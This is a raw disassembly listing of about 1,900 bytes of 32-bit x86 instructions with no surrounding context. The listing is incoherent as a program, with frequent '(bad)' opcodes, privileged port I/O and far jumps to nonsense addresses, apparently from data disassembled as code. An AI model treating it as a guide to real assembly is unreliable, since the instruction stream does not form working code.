  4136ef:	mov    esp,0x2cf5718b
  4136f4:	push   ds
  4136f5:	scas   eax,DWORD PTR es:[edi]
  4136f6:	mov    al,0x52
  4136f8:	xchg   edi,eax
  4136f9:	cdq    
  4136fa:	jo     0x413734
  4136fc:	fdiv   QWORD PTR [edi]
  4136fe:	mov    ch,0x3f
  413700:	clc    
  413701:	push   0x5236837d
  413706:	mov    ss,edi
  413708:	mov    bl,0x80
  41370a:	test   al,0x74
  41370c:	cmp    eax,0x801e4ade
  413711:	lods   eax,DWORD PTR ds:[esi]
  413712:	inc    dh
  413714:	fdiv   st,st(6)
  413716:	sbb    dh,bl
  413718:	mov    eax,0x3a01f85
  41371d:	pop    esi
  41371e:	cmp    al,dl
  413720:	lock inc edi
  413722:	mov    ds:0x6daf7c92,eax
  413727:	mov    ecx,0xa340466d
  41372c:	xor    eax,DWORD PTR [ecx+0x59]
  41372f:	adc    eax,0x86214f5f
  413734:	das    
  413735:	pop    ebp
  413736:	lea    edx,[ebx+eax*4+0xa]
  41373a:	rcl    BYTE PTR [edi-0x52],1
  41373d:	dec    edx
  41373e:	inc    ecx
  41373f:	outs   dx,DWORD PTR ds:[esi]
  413740:	mov    ch,0xf9
  413742:	inc    ebx
  413743:	jp     0x413735
  413745:	stc    
  413746:	mov    al,0xbf
  413748:	fild   QWORD PTR [edx+0x21]
  41374b:	jnp    0x413731
  41374d:	ja     0x4136f6
  41374f:	sbb    al,0x94
  413751:	test   eax,0xa90a116c
  413756:	call   0xd5d0:0xb4ff5e28
  41375d:	mov    al,ds:0x7c9b57b6
  413762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413763:	into   
  413764:	into   
  413765:	ss mov ebp,0xbed769a7
  41376b:	inc    esi
  41376c:	lds    ebp,FWORD PTR [ebp-0x27b78a2c]
  413772:	std    
  413773:	nop
  413774:	xor    BYTE PTR [ebx+0xada3b60],ch
  41377a:	in     al,0xe3
  41377c:	dec    ebx
  41377d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41377e:	lea    esp,[edi+edx*8+0x38475334]
  413785:	sub    al,0x8b
  413787:	add    eax,0x94084911
  41378c:	leave  
  41378d:	and    DWORD PTR [eax],ebp
  41378f:	xchg   edi,eax
  413790:	scas   al,BYTE PTR es:[edi]
  413791:	jl     0x41380d
  413793:	ds in  eax,0xac
  413796:	mov    al,ds:0x69cbf9f8
  41379b:	lahf   
  41379c:	ins    BYTE PTR es:[edi],dx
  41379d:	mov    bl,0xcb
  41379f:	or     BYTE PTR [ebx-0x4cc2a3],bl
  4137a5:	add    al,0x65
  4137a7:	pop    eax
  4137a8:	es push ds
  4137aa:	shr    BYTE PTR [edi-0x6a36d928],0xcd
  4137b1:	jmp    0x413770
  4137b3:	(bad)  
  4137b5:	arpl   WORD PTR [esp+eax*1+0x25a3825d],bp
  4137bc:	cli    
  4137bd:	pusha  
  4137be:	sub    edi,DWORD PTR [eax-0x61576b56]
  4137c4:	xchg   esp,eax
  4137c5:	shl    BYTE PTR [edx-0x69],0x4e
  4137c9:	pop    edx
  4137ca:	out    dx,al
  4137cb:	ins    BYTE PTR es:[edi],dx
  4137cc:	rcl    bh,cl
  4137ce:	jns    0x413813
  4137d0:	int    0xc1
  4137d2:	das    
  4137d3:	push   esi
  4137d4:	gs leave 
  4137d6:	jmp    0x717b460c
  4137db:	cwde   
  4137dc:	int3   
  4137dd:	xchg   esp,eax
  4137de:	and    BYTE PTR [ebx-0x48bb754d],ah
  4137e4:	mov    ah,0x7
  4137e6:	int    0x7a
  4137e8:	sub    edi,DWORD PTR [edx]
  4137ea:	mov    dh,0xaf
  4137ec:	int    0x94
  4137ee:	ins    DWORD PTR es:[edi],dx
  4137ef:	push   DWORD PTR [edx]
  4137f1:	mov    ch,0x17
  4137f3:	dec    edi
  4137f4:	enter  0x4322,0x7e
  4137f8:	xchg   ebx,eax
  4137f9:	fprem  
  4137fb:	sbb    al,0x4f
  4137fd:	mov    BYTE PTR [eax],0xce
  413800:	shl    dl,cl
  413802:	scas   al,BYTE PTR es:[edi]
  413803:	xor    bl,dl
  413805:	jp     0x4137c5
  413807:	arpl   WORD PTR [edi+edi*4],cx
  41380a:	dec    eax
  41380b:	or     BYTE PTR [eax+0xe270a35],bh
  413811:	scas   eax,DWORD PTR es:[edi]
  413812:	adc    DWORD PTR [ecx],esi
  413814:	call   0x11788e29
  413819:	inc    esi
  41381a:	inc    ecx
  41381b:	cs jb  0x413827
  41381e:	jne    0x4137f7
  413820:	loop   0x413803
  413822:	jecxz  0x413823
  413824:	lods   eax,DWORD PTR ds:[esi]
  413825:	or     al,0xc2
  413827:	fwait
  413828:	push   0xffffffae
  41382a:	and    BYTE PTR [esi],dh
  41382c:	adc    bl,al
  41382e:	mov    esp,0xa76ad482
  413833:	sub    BYTE PTR [ecx-0x27d5bf49],ch
  413839:	add    DWORD PTR [ecx],ebp
  41383b:	inc    edi
  41383c:	sbb    dh,BYTE PTR [ebp+0x72]
  41383f:	adc    DWORD PTR [eax],esp
  413841:	adc    edi,DWORD PTR [ecx]
  413843:	hlt    
  413844:	js     0x4138b8
  413846:	shr    bh,0x4d
  413849:	mov    ebp,DWORD PTR [ebx-0x5a9a63f3]
  41384f:	stos   DWORD PTR es:[edi],eax
  413850:	call   0xb19e36e
  413855:	sub    al,0xa0
  413857:	leave  
  413858:	push   0x6
  41385a:	into   
  41385b:	inc    edx
  41385c:	dec    ebx
  41385d:	lock mov eax,ds:0xdbdc6926
  413863:	stos   BYTE PTR es:[edi],al
  413864:	dec    esi
  413865:	dec    ebx
  413866:	(bad)  
  413867:	popf   
  413868:	in     al,dx
  413869:	mov    edi,0x494f5874
  41386e:	dec    ebp
  41386f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413870:	inc    eax
  413871:	scas   eax,DWORD PTR es:[edi]
  413872:	dec    eax
  413873:	loopne 0x4138cb
  413875:	das    
  413876:	data16 jnp 0x4138b1
  413879:	lds    edi,FWORD PTR [esi+eax*4+0x7f459f70]
  413880:	or     eax,0x5df8836d
  413885:	add    eax,0xe44ed3e8
  41388a:	push   cs
  41388b:	test   esp,eax
  41388d:	mov    dh,0x19
  41388f:	in     eax,0x52
  413891:	add    DWORD PTR [eax-0x5c],eax
  413894:	sbb    BYTE PTR [eax],ch
  413896:	push   ss
  413897:	and    ah,BYTE PTR [esi+ebx*1]
  41389a:	adc    al,0x81
  41389c:	mov    al,ds:0x2b905f89
  4138a1:	int    0xd2
  4138a3:	lock addr16 (bad) 
  4138a6:	and    DWORD PTR [edi+0x4e92504b],esi
  4138ac:	and    BYTE PTR [edx+0x6486809b],dh
  4138b2:	push   cs
  4138b3:	fistp  QWORD PTR ds:0x337b0b6b
  4138b9:	add    DWORD PTR [ecx+0x2042aaa8],edi
  4138bf:	pusha  
  4138c0:	cld    
  4138c1:	sub    eax,0x2fa0a630
  4138c6:	add    al,0xfd
  4138c8:	(bad)  
  4138c9:	into   
  4138ca:	aam    0xc0
  4138cc:	les    esp,FWORD PTR [eax]
  4138ce:	icebp  
  4138cf:	mov    ch,0x75
  4138d1:	fistp  DWORD PTR [esi-0x43a0836a]
  4138d7:	push   edx
  4138d8:	in     eax,dx
  4138d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138da:	daa    
  4138db:	push   0x683d2be9
  4138e0:	repz sub DWORD PTR [esi],edi
  4138e3:	rcr    BYTE PTR [edi],1
  4138e5:	dec    edx
  4138e6:	inc    eax
  4138e7:	adc    edi,ecx
  4138e9:	push   eax
  4138ea:	adc    BYTE PTR [edi+0x3c],0xe8
  4138ee:	imul   ecx,DWORD PTR [esi+0xb6de332],0x3
  4138f5:	ins    BYTE PTR es:[edi],dx
  4138f6:	lods   al,BYTE PTR ds:[esi]
  4138f7:	nop
  4138f8:	popa   
  4138f9:	lock mov al,ds:0xf1e0d838
  4138ff:	sbb    cl,al
  413901:	jmp    0xe28b:0x43eea160
  413908:	sbb    ebx,ebx
  41390a:	ret    0x4b2
  41390d:	cmp    eax,0xa6aaea3b
  413912:	mov    edx,0x33371b64
  413917:	push   ebx
  413918:	sbb    cl,BYTE PTR [edi+0x6cba944]
  41391e:	pusha  
  41391f:	repnz clc 
  413921:	repz call 0x17823fb1
  413927:	pusha  
  413928:	fidiv  DWORD PTR [ebx-0x14]
  41392b:	cmp    al,0x6e
  41392d:	mov    ebx,eax
  41392f:	inc    edi
  413930:	pop    es
  413931:	mov    al,0xd4
  413933:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  413935:	mov    ah,0x8f
  413937:	push   edx
  413938:	ja     0x41398a
  41393a:	inc    edi
  41393b:	adc    ebp,edx
  41393d:	xor    eax,0xf5ed6b61
  413942:	mov    eax,0xa3794e6c
  413947:	pushf  
  413948:	sti    
  413949:	fimul  DWORD PTR [edi-0x5828d1d9]
  41394f:	mov    ch,0xeb
  413951:	add    bl,BYTE PTR [eax-0xc120a79]
  413957:	push   ds
  413958:	call   0x8c50:0xc994b7b4
  41395f:	arpl   WORD PTR [edx+0x37],dx
  413962:	ins    DWORD PTR es:[edi],dx
  413963:	mov    ah,0x6c
  413965:	sahf   
  413966:	inc    esi
  413967:	fsub   DWORD PTR es:[eax+0x6f]
  41396b:	sbb    DWORD PTR [esi],0xffffff86
  41396e:	xchg   edi,eax
  41396f:	mov    al,ds:0x8f9cfd60
  413974:	dec    edx
  413975:	dec    ecx
  413976:	cwde   
  413977:	dec    ecx
  413978:	ret    0x3c5d
  41397b:	inc    eax
  41397c:	or     al,0x47
  41397e:	mov    esp,0x23c46d73
  413983:	jnp    0x413975
  413985:	(bad)  
  413986:	pop    ebp
  413987:	nop
  413988:	pop    es
  413989:	lods   eax,DWORD PTR ds:[esi]
  41398a:	mov    eax,ds:0xfd97812b
  41398f:	shr    DWORD PTR [ecx+0x61fb6025],0x5e
  413996:	out    0xe,eax
  413998:	push   edx
  413999:	daa    
  41399a:	cmp    ebp,DWORD PTR [eax]
  41399c:	dec    edx
  41399d:	mov    al,ds:0xbb138220
  4139a2:	pop    ss
  4139a3:	jl     0x4139dc
  4139a5:	sbb    al,0x0
  4139a7:	sbb    BYTE PTR [ebx-0x8537fb1],bl
  4139ad:	push   esi
  4139ae:	ins    BYTE PTR es:[edi],dx
  4139af:	rol    BYTE PTR [ebx],1
  4139b1:	cmp    DWORD PTR [ebx],ecx
  4139b3:	pop    edi
  4139b4:	mov    ds:0xe65b524b,al
  4139b9:	cmp    al,0x43
  4139bb:	cwde   
  4139bc:	jne    0x413a2e
  4139be:	jo     0x413a33
  4139c0:	in     al,dx
  4139c1:	sbb    BYTE PTR [ebp+eax*8+0x26db3d61],ch
  4139c8:	inc    edi
  4139c9:	dec    ebp
  4139ca:	pop    es
  4139cb:	pushf  
  4139cc:	add    cl,BYTE PTR [esi]
  4139ce:	popa   
  4139cf:	adc    ch,BYTE PTR [ecx-0x9dc4e4d]
  4139d5:	pusha  
  4139d6:	sar    BYTE PTR [ebx*4+0x46ca1a9c],0x3d
  4139de:	fs dec edx
  4139e0:	mov    ebp,0xb95e84a6
  4139e5:	xchg   ebx,eax
  4139e6:	shl    ecx,cl
  4139e8:	push   ds
  4139e9:	xchg   ebp,eax
  4139ea:	sub    eax,0x87fe9cf6
  4139ef:	push   ebx
  4139f0:	inc    ecx
  4139f1:	mov    cl,0x65
  4139f3:	dec    edi
  4139f4:	imul   edi,DWORD PTR [esp+esi*8+0x237c5de6],0x23ae8b52
  4139ff:	sbb    BYTE PTR [bx+0x1d43],ah
  413a04:	push   ebx
  413a05:	(bad)  
  413a06:	cmp    BYTE PTR [ebx+eiz*8],al
  413a09:	xchg   edx,eax
  413a0a:	sti    
  413a0b:	ficomp DWORD PTR [ecx-0x55]
  413a0e:	jnp    0x4139de
  413a10:	xchg   ebx,eax
  413a11:	gs out dx,al
  413a13:	cmp    ebp,DWORD PTR [eax+0x166213b8]
  413a19:	and    eax,ebx
  413a1b:	ficom  DWORD PTR [ebp+0x453caec]
  413a21:	sbb    al,0x7e
  413a23:	lock test BYTE PTR [esi+0x4c],dh
  413a27:	loopne 0x413a10
  413a29:	out    0xf2,eax
  413a2b:	bound  esi,QWORD PTR [edi-0x1f]
  413a2e:	(bad)  
  413a2f:	dec    edi
  413a30:	test   ch,al
  413a32:	dec    eax
  413a33:	ror    edx,cl
  413a35:	mov    WORD PTR [eax+0x4804f70b],cs
  413a3b:	sbb    eax,0xdf3fe1d4
  413a40:	or     al,0xa5
  413a42:	fisttp WORD PTR [ebp+0x5a]
  413a45:	mov    ebp,0x6dab4a3a
  413a4a:	jb     0x413a4a
  413a4c:	sub    DWORD PTR [ecx-0x5],eax
  413a4f:	stos   BYTE PTR es:[edi],al
  413a50:	mov    ebx,0x65d79c56
  413a55:	dec    ebx
  413a56:	dec    edi
  413a57:	fild   QWORD PTR [ebp+0x76fb546]
  413a5d:	fnstenv [edi+0x5b]
  413a60:	cmc    
  413a61:	cmp    BYTE PTR [ebx-0x3ea34bfb],dh
  413a67:	and    eax,0xc1fe747f
  413a6c:	jle    0x413aa4
  413a6e:	clc    
  413a6f:	mov    edi,0x43d68692
  413a74:	call   0xcf27:0xbc2a62ba
  413a7b:	mov    ds:0x764c09c9,eax
  413a80:	not    DWORD PTR [ecx+edx*2-0x7a]
  413a84:	rcr    DWORD PTR [esi],cl
  413a86:	nop
  413a87:	(bad)  
  413a88:	ret    0x9306
  413a8b:	popa   
  413a8c:	addr16 out 0x92,al
  413a8f:	mov    bh,0x1f
  413a91:	lds    ebp,FWORD PTR [edx+ecx*2-0x31]
  413a95:	add    cl,BYTE PTR [ecx+0x2]
  413a98:	out    dx,al
  413a99:	cli    
  413a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a9b:	stos   DWORD PTR es:[edi],eax
  413a9c:	mov    esp,0x6ec6e860
  413aa1:	or     esi,ecx
  413aa3:	xor    al,0x50
  413aa5:	std    
  413aa6:	jle    0x413a2b
  413aa8:	xor    DWORD PTR [ecx-0x6c],edi
  413aab:	(bad)  [edi-0x6a]
  413aae:	(bad)
  413ab1:	or     DWORD PTR [edx+0x69],edi
  413ab4:	(bad)  
  413ab5:	data16 adc ch,BYTE PTR [eax+0x45]
  413ab9:	cmp    DWORD PTR [edi],ecx
  413abb:	ret    0x651c
  413abe:	pop    ss
  413abf:	dec    ebx
  413ac0:	les    ecx,FWORD PTR [edi+esi*1-0x62]
  413ac4:	lods   eax,DWORD PTR ds:[esi]
  413ac5:	xor    esi,esp
  413ac7:	js     0x413aac
  413ac9:	dec    esp
  413aca:	pop    bp
  413acc:	imul   ecx,DWORD PTR [ecx+0x41],0x80ed545b
  413ad3:	jbe    0x413adf
  413ad5:	xchg   DWORD PTR [ebx],esp
  413ad7:	xor    al,0x25
  413ad9:	pop    ds
  413ada:	jl     0x413b05
  413adc:	mov    ecx,0x2f22e017
  413ae1:	call   0x26fb2774
  413ae6:	(bad)  
  413ae7:	or     al,0x6f
  413ae9:	les    edi,FWORD PTR [ecx]
  413aeb:	mov    ch,BYTE PTR [esi-0x5d]
  413aee:	faddp  st(5),st
  413af0:	pop    es
  413af1:	jge    0x6a46d970
  413af7:	push   esi
  413af8:	fsub   QWORD PTR [ebp-0x4d5e9285]
  413afe:	inc    ebx
  413aff:	cwde   
  413b00:	fdiv   DWORD PTR [ebp-0x28]
  413b03:	lods   eax,DWORD PTR ds:[esi]
  413b04:	adc    edi,DWORD PTR [edi]
  413b06:	jl     0x413b58
  413b08:	fs std 
  413b0a:	cs jmp 0x413acb
  413b0d:	adc    eax,0x87e78ba9
  413b12:	mov    BYTE PTR [edi+0x29],ah
  413b15:	(bad)  
  413b16:	out    dx,eax
  413b17:	mov    ds:0xcbde2361,eax
  413b1c:	mov    ebx,0x40f91712
  413b21:	(bad)  
  413b22:	fsubp  st(1),st
  413b24:	imul   edi,DWORD PTR [esi-0x44],0xffffffad
  413b28:	mov    edx,0xe53fe5bf
  413b2d:	xor    DWORD PTR [ecx],0xffffffd6
  413b30:	mov    ds:0xea8a069a,al
  413b35:	ror    DWORD PTR [esi+0x950c2b8],cl
  413b3b:	cmp    DWORD PTR [ebx],ebx
  413b3d:	cld    
  413b3e:	nop
  413b3f:	inc    DWORD PTR [eax-0x4d]
  413b42:	call   0xac59:0xb3f21958
  413b49:	lea    ebp,[ecx+0xd878eee]
  413b4f:	inc    esi
  413b50:	or     al,bh
  413b52:	dec    DWORD PTR [edx+0x5c]
  413b55:	mov    ch,0x58
  413b57:	ds inc ebp
  413b59:	jmp    DWORD PTR [edi+eiz*4-0x53aec714]
  413b60:	mov    edi,0xf0edc09c
  413b65:	rcl    edx,cl
  413b67:	cmp    eax,0x5323f867
  413b6c:	xchg   esp,eax
  413b6d:	std    
  413b6e:	jg     0x413b28
  413b70:	or     dl,BYTE PTR [ebp-0x1e]
  413b73:	sbb    DWORD PTR ss:[esi+0x3e0e656],ebx
  413b7a:	or     ch,bh
  413b7c:	add    eax,ecx
  413b7e:	repz push ebp
  413b80:	pop    esi
  413b81:	lahf   
  413b82:	jb     0x413b20
  413b84:	inc    esi
  413b85:	sub    al,0x70
  413b87:	add    BYTE PTR [edi],0xd5
  413b8a:	mov    cl,0x5c
  413b8c:	icebp  
  413b8d:	adc    BYTE PTR [edi-0x7],dh
  413b90:	fcom   QWORD PTR [ebx-0x5b]
  413b93:	sbb    DWORD PTR [ecx],edi
  413b95:	repnz push edx
  413b97:	pop    esi
  413b98:	ret    
  413b99:	sub    eax,0x10315c9f
  413b9e:	mov    eax,0x7b5a7fb9
  413ba3:	repz out dx,al
  413ba5:	inc    eax
  413ba6:	push   ss
  413ba7:	fcmovnu st,st(4)
  413ba9:	jne    0x413b73
  413bab:	sbb    al,0x7
  413bad:	ins    BYTE PTR es:[edi],dx
  413bae:	or     cl,dl
  413bb0:	xchg   ebp,eax
  413bb1:	jmp    0x55c8cb2a
  413bb6:	sub    al,0x8b
  413bb8:	std    
  413bb9:	loopne 0x413be7
  413bbb:	call   0xa431120e
  413bc0:	popa   
  413bc1:	sbb    DWORD PTR [edx],edi
  413bc3:	mov    ecx,0x42c94fb5
  413bc8:	daa    
  413bc9:	jg     0x413c33
  413bcb:	sub    al,0xec
  413bcd:	in     al,0x99
  413bcf:	enter  0xff27,0xcc
  413bd3:	scas   eax,DWORD PTR es:[edi]
  413bd4:	dec    ebx
  413bd5:	mov    ch,0x2f
  413bd7:	mov    ebp,0x13dffd4c
  413bdc:	dec    ebp
  413bdd:	shr    cl,cl
  413bdf:	ret    0xcd46
  413be2:	retf   0xc14c
  413be5:	jl     0x413b9d
  413be7:	mov    ecx,DWORD PTR ds:0x70f479af
  413bed:	rcr    DWORD PTR [eax+0x35],1
  413bf0:	cld    
  413bf1:	popfw  
  413bf3:	sbb    DWORD PTR [ebx-0x44a99c9f],ecx
  413bf9:	test   BYTE PTR [ebp+0x18],ch
  413bfc:	sub    BYTE PTR [eax-0x7650486e],ah
  413c02:	ins    DWORD PTR es:[edi],dx
  413c03:	gs pushf 
  413c05:	mov    esp,0xeb73dd4d
  413c0a:	mov    BYTE PTR [edi],ah
  413c0c:	jo     0x413be7
  413c0e:	stc    
  413c0f:	cli    
  413c10:	in     al,dx
  413c11:	pop    ecx
  413c12:	lods   eax,DWORD PTR ds:[esi]
  413c13:	outs   dx,BYTE PTR ds:[esi]
  413c14:	add    DWORD PTR [ecx],ebp
  413c16:	mov    ds:0x69c58392,al
  413c1b:	jecxz  0x413bfd
  413c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c1e:	es jne 0x413c34
  413c21:	pop    ebp
  413c22:	inc    edx
  413c23:	daa    
  413c24:	mov    ebx,0x33051c15
  413c29:	inc    ecx
  413c2a:	xor    DWORD PTR [ebx],0x42c4376f
  413c30:	adc    al,0x98
  413c32:	cmp    dl,ah
  413c34:	ss aam 0x23
  413c37:	xor    BYTE PTR [eax+0x309cc23c],ch
  413c3d:	jo     0x413c5b
  413c3f:	mov    cs,WORD PTR [eax+0x6c3ee4bd]
  413c45:	popf   
  413c46:	sahf   
  413c47:	test   eax,0xb1ba8347
  413c4c:	dec    eax
  413c4d:	jnp    0x413ca2
  413c4f:	xchg   esp,eax
  413c50:	sahf   
  413c51:	dec    ebx
  413c52:	pop    ss
  413c53:	(bad)  
  413c54:	in     al,dx
  413c55:	adc    ecx,0x2f
  413c58:	cld    
  413c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c5a:	pop    edx
  413c5b:	or     ebx,edx
  413c5d:	call   0xa15f49ff
  413c62:	xor    dh,bh
  413c64:	add    DWORD PTR [ecx+edi*1-0x10],esp
  413c68:	test   DWORD PTR ds:0x2b06b9cd,edi
  413c6e:	or     al,0x1a
  413c70:	add    edx,DWORD PTR [edi+0x72bc4fe5]
  413c76:	in     al,0x69
  413c78:	pop    ebx
  413c79:	push   esp
  413c7a:	push   ebx
  413c7b:	or     ebp,ebx
  413c7d:	and    edi,DWORD PTR [ecx-0x76]
  413c80:	or     al,0x4a
  413c82:	fwait
  413c83:	scas   al,BYTE PTR es:[edi]
  413c84:	push   ds
  413c85:	fimul  DWORD PTR [ebx+0x223ce083]
  413c8b:	outs   dx,BYTE PTR ds:[esi]
  413c8c:	call   FWORD PTR [ebp+ebp*1+0x5f6eee94]
  413c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c94:	pop    ecx
  413c95:	mov    eax,ds:0x771906d7
  413c9a:	(bad)  
  413c9b:	aas    
  413c9c:	push   ebx
  413c9d:	pusha  
  413c9e:	and    DWORD PTR [ebx+eax*8+0x7b98a3f],0x58
  413ca6:	push   0xe0809e2c
  413cab:	fadd   DWORD PTR [ecx]
  413cad:	aam    0x42
  413caf:	das    
  413cb0:	push   eax
  413cb1:	push   esi
  413cb2:	test   edx,esp
  413cb4:	pop    ds
  413cb5:	pop    edi
  413cb6:	and    bl,BYTE PTR [ecx]
  413cb8:	retf   
  413cb9:	jmp    0x9ad1f6d8
  413cbe:	stos   BYTE PTR es:[edi],al
  413cbf:	mov    dl,0xbf
  413cc1:	xor    al,BYTE PTR ds:0x2daa16f7
  413cc7:	add    eax,0xf37f98ad
  413ccc:	jae    0x413cdf
  413cce:	in     al,0xdf
  413cd0:	push   ebx
  413cd1:	dec    ebx
  413cd2:	les    edi,FWORD PTR [ebx+ecx*2+0x51]
  413cd6:	aad    0x43
  413cd8:	sub    cl,BYTE PTR gs:[ebp+0x8]
  413cdc:	aad    0x6f
  413cde:	ret    
  413cdf:	pop    ebp
  413ce0:	push   ebp
  413ce1:	pop    es
  413ce2:	pop    edi
  413ce3:	imul   esp,DWORD PTR [edx],0xffffffe0
  413ce6:	mov    ah,0x1c
  413ce8:	je     0x413d03
  413cea:	test   BYTE PTR [edi+0x52d08f15],al
  413cf0:	ss mov al,0xf9
  413cf3:	and    eax,0xddaf11fb
  413cf8:	jp     0x413ca3
  413cfa:	pushf  
  413cfb:	out    dx,al
  413cfc:	inc    eax
  413cfd:	idiv   DWORD PTR [ebx+0x2b]
  413d00:	mov    al,BYTE PTR [ebx+edx*1-0x7992a85c]
  413d07:	add    edx,DWORD PTR [eax+0x30]
  413d0a:	sub    BYTE PTR [ebp+0xa5c6d21],bh
  413d10:	mov    BYTE PTR [esi+ecx*2],cl
  413d13:	sub    ah,dl
  413d15:	mov    bh,0x46
  413d17:	fisubr DWORD PTR [eax+0x1e]
  413d1a:	mov    bl,BYTE PTR ds:0xe9948300
  413d20:	xchg   esp,eax
  413d21:	in     eax,dx
  413d22:	in     eax,0x49
  413d24:	(bad)  
  413d25:	les    ebx,FWORD PTR [ecx+edi*8]
  413d28:	push   esp
  413d29:	ins    DWORD PTR es:[edi],dx
  413d2a:	jb     0x413d57
  413d2c:	aam    0x8f
  413d2e:	jo     0x413d07
  413d30:	add    BYTE PTR [edx+0x56a25e58],ah
  413d36:	or     eax,0x1e184003
  413d3b:	test   BYTE PTR [edx+0x75fa604a],dl
  413d41:	fld    TBYTE PTR [eax-0x3ed38b78]
  413d47:	add    DWORD PTR [eax+0x27],edx
  413d4a:	cs gs sub edx,DWORD PTR ds:[edx-0x9]
  413d50:	cwde   
  413d51:	xchg   ebp,eax
  413d52:	scas   eax,DWORD PTR es:[edi]
  413d53:	mov    ecx,0xc6fa276a
  413d58:	mov    eax,ds:0x61bd3cf
  413d5d:	js     0x413ddb
  413d5f:	xchg   edi,eax
  413d60:	sub    bl,BYTE PTR [ecx+esi*4-0x50b95f73]
  413d67:	ins    DWORD PTR es:[edi],dx
  413d68:	ficomp DWORD PTR [ebp-0x2c]
  413d6b:	outs   dx,DWORD PTR ds:[esi]
  413d6c:	dec    esp
  413d6d:	mov    ds:0xcf7587e5,eax
  413d72:	mov    ah,0x3c
  413d74:	jns    0x413d00
  413d76:	mov    ds:0xa0a96bbe,eax
  413d7b:	cld    
  413d7c:	jbe    0x413d80
  413d7e:	scas   eax,DWORD PTR es:[edi]
  413d7f:	data16 cmp dl,BYTE PTR [ecx+0x20]
  413d83:	vpmacsdqh ymm10,ymm4,YMMWORD PTR [ebx],ymm2
  413d89:	popf   
  413d8a:	retf   0xc089
  413d8d:	cdq    
  413d8e:	test   al,0xaa
  413d90:	adc    ebx,DWORD PTR [eax]
  413d92:	fs imul edx,esp,0x6
  413d96:	or     BYTE PTR [esi-0x57],dh
  413d99:	mov    dl,BYTE PTR ds:[ebx+0x4f]
  413d9d:	cmp    bl,BYTE PTR [edx+0x449d9dbf]
  413da3:	in     eax,dx
  413da4:	sbb    DWORD PTR [ebx+0x64b67ab0],esp
  413daa:	shl    al,0xc2
  413dad:	pop    es
  413dae:	je     0x413d8a
  413db0:	mov    ds:0xd02d09bd,eax
  413db5:	cli    
  413db6:	sub    DWORD PTR [edx],ecx
  413db8:	and    DWORD PTR [eax],eax
  413dba:	in     al,dx
  413dbb:	das    
  413dbc:	mov    WORD PTR [ebx+0xc],ss
  413dbf:	cld    
  413dc0:	mov    dl,BYTE PTR ss:[eax-0x9]
  413dc4:	fs mov bl,0xb9
  413dc7:	(bad)  
  413dc8:	jmp    0x413d8e
  413dca:	push   ecx
  413dcb:	or     eax,0xbe96c6c4
  413dd0:	mov    al,ds:0x53cb5fa5
  413dd5:	jb     0x413e49
  413dd7:	lahf   
  413dd8:	xchg   ecx,eax
  413dd9:	int3   
  413dda:	jl     0x413d7e
  413ddc:	or     al,0x41
  413dde:	xchg   BYTE PTR [edx-0x3846fb85],bl
  413de4:	mov    al,0x2e
  413de6:	mov    bh,0x90
  413de8:	repz push ecx
  413dea:	repz jne 0x413e4f
  413ded:	lods   eax,DWORD PTR ds:[esi]
  413dee:	stc    
  413def:	sbb    BYTE PTR [edx+0x3f5f67f3],bh
  413df5:	test   eax,0xd4b5c928
  413dfa:	sbb    DWORD PTR [ebx],ebp
  413dfc:	mov    ds:0x7334141a,al
  413e01:	outs   dx,BYTE PTR ds:[esi]
  413e02:	mov    esi,0xa831a812
  413e07:	sahf   
  413e08:	xlat   BYTE PTR ds:[ebx]
  413e09:	in     al,0x4f
  413e0b:	xchg   BYTE PTR [eax+eax*2+0x3251afe],cl
  413e12:	and    eax,0x1af9020a
  413e17:	cmp    DWORD PTR [eax],esp
  413e19:	inc    ebp
  413e1a:	in     al,0x77
  413e1c:	pop    edi
  413e1d:	shl    BYTE PTR [ecx],1
  413e1f:	or     cl,BYTE PTR ss:[edi+0x37]
  413e23:	sub    esp,DWORD PTR [edx]
  413e25:	das    
  413e26:	cmc    
  413e27:	and    BYTE PTR [ecx],dl
  413e29:	mov    ah,cl
  413e2b:	iret   
  413e2c:	pop    esi
  413e2d:	(bad)  
  413e2e:	mov    edx,0x73a3f195
  413e33:	and    eax,0x2775072f
  413e38:	mov    al,ds:0x2d4fc666
  413e3d:	mov    ds:0xf635da52,al
  413e42:	fs cmp al,0x67
  413e45:	fwait
  413e46:	(bad)  
  413e47:	fst    QWORD PTR [ebp+0x75a2646f]
  413e4d:	pushf  
  413e4e:	popf   
  413e4f:	je     0x413e93
  413e51:	xor    eax,0xc2d7e0d9
  413e56:	nop
  413e57:	or     dh,BYTE PTR [eax-0x31]
  413e5a:	scas   eax,DWORD PTR es:[edi]
  413e5b:	mov    bl,0x45
  413e5d:	jl     0x413e60
  413e5f:	push   edi
  413e60:	(bad)  
  413e61:	stos   BYTE PTR es:[edi],al
  413e62:	loop   0x413ebc
  413e64:	aad    0xea
  413e66:	push   0x3
  413e68:	icebp  
  413e69:	outs   dx,DWORD PTR ds:[esi]
  413e6a:	sub    esp,ebx
  413e6c:	pushf  
  413e6d:	mov    ecx,0xf671483c
  413e72:	scas   eax,DWORD PTR es:[edi]
  413e73:	neg    BYTE PTR [ebp-0x5fef55a6]
  413e79:	xchg   edi,eax
  413e7a:	sbb    DWORD PTR [ecx],0x29
  413e7d:	add    BYTE PTR [edx+0x25],al
  413e80:	std    
  413e81:	cs data16 jae 0x413ed3
  413e85:	xor    eax,0x92bb6b16
  413e8a:	fs push cs
  413e8c:	push   0xfc1a27d
  413e91:	and    esi,DWORD PTR [ebp-0x5d]
  413e94:	sti    
  413e95:	jbe    0x413ef1
  413e97:	pop    ss
  413e98:	(bad)  
  413e99:	scas   al,BYTE PTR es:[edi]
  413e9a:	pop    edi
  413e9b:	loop   0x413f12
  413e9d:	jns    0x413e97
  413e9f:	sub    BYTE PTR ds:0xb131d40b,dl
  413ea5:	data16 in al,0xa2
  413ea8:	out    dx,al
  413ea9:	mov    ch,0x57
  413eab:	rol    BYTE PTR [edi+0x53],1
  413eae:	adc    BYTE PTR [esi],dh
  413eb0:	dec    eax
  413eb1:	call   0x90d:0x34534775
  413eb8:	ds inc eax
  413eba:	mov    ecx,0x93c1acf7
  413ebf:	repz aam 0x0
